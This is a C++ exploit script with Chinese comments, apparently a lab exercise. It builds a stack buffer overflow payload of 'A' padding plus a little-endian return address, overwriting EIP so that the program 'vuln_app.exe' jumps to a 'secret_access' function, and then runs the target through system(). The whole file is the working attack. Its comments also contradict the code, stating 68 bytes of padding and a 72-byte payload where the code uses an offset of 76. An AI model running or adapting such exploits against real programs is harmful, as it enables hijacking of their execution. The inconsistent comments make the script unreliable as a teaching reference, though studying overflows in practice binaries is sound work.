#include <iostream>
#include <windows.h>
#include <string>
#include <vector>

using namespace std;

int main() {
	// ==========================================================
	// 【重要】请修改这里的地址为你用调试器找到的 secret_access 地址
	// ==========================================================
	unsigned int target_address = 0x00401460;

	// 1. 准备 Payload 缓冲区
	// 我们需要 68 字节的填充 + 4 字节的地址 = 72 字节
	// 多留一点空间防止溢出
	char payload[100];
	int offset = 76;
	// 2. 填充 68 个 'A'
	memset(payload, 'A', offset);

	// 3. 拼接返回地址 (覆盖 EIP)
	// 这里使用了指针转换技巧，直接把地址按“小端序”写入内存
	// payload + 68 就是 'A' 结束的位置
	unsigned int *pEIP = (unsigned int *)(payload + offset);
	*pEIP = target_address;

	// 4. 添加字符串结束符
	// 此时 payload 的前72个字节已经构造好了
	// 小端序存储：0x00401460 在内存里是 60 14 40 00
	// 正好 00 是结束符，strcpy 看到它就会停止，这很完美。
	payload[offset + 4] = '\0';

	// 5. 构造完整的 CMD 命令
	// 相当于在命令行执行: vuln_app.exe "AAAAAAAAAAAAAAAA....."
	string command = "vuln_app.exe \"";
	command += string(payload, offset + 4); // 强制拼接72个字节
	command += "\"";

	cout << "[*] 攻击载荷已构建，长度: " << command.length() << endl;
	cout << "[*] 正在启动漏洞程序..." << endl;

	// 6. 执行命令
	system(command.c_str());

	return 0;
}
